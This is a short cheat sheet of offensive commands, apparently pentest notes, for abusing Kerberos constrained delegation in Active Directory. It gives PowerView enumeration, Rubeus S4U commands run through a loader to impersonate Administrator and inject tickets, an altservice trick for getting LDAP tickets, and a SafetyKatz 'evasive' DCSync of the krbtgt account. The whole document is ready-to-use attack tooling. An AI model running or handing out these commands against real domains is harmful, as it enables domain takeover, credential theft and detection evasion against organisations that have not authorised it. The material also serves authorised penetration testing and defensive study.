# Constrained Delegation S4U

Abuse a service account with constrained delegation to impersonate any user to allowed services.

## Identify Delegation Accounts
```powershell
Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select name, msds-allowedtodelegateto
```

## S4U2Self + S4U2Proxy (Service Account)
```
Loader.exe -path Rubeus.exe -args s4u /user:<svc_account> /aes256:<svc_aes256> /impersonateuser:Administrator /msdsspn:<SPN/TARGET> /ptt
```

## S4U with altservice (get ldap ticket for DCSync)
If delegation target is `cifs/<TARGET>`, request `/altservice:ldap` to get LDAP ticket for DCSync:
```
Loader.exe -path Rubeus.exe -args s4u /user:<svc_account> /aes256:<svc_aes256> /impersonateuser:Administrator /msdsspn:cifs/<TARGET> /altservice:ldap /ptt
```
Then DCSync:
```
Loader.exe -path SafetyKatz.exe -args "lsadump::evasive-dcsync /user:<domain>\krbtgt" "exit"
```

## S4U for Machine Account (RBCD overlap)
```
Loader.exe -path Rubeus.exe -args s4u /user:<machine$> /aes256:<machine_aes256> /impersonateuser:Administrator /msdsspn:http/<TARGET> /ptt
```

## Notes
- `altservice` works because the service name in the ticket is not protected by PAC
- Only the SPN `<service>/<host>` part is checked; switching service name post-issuance is valid
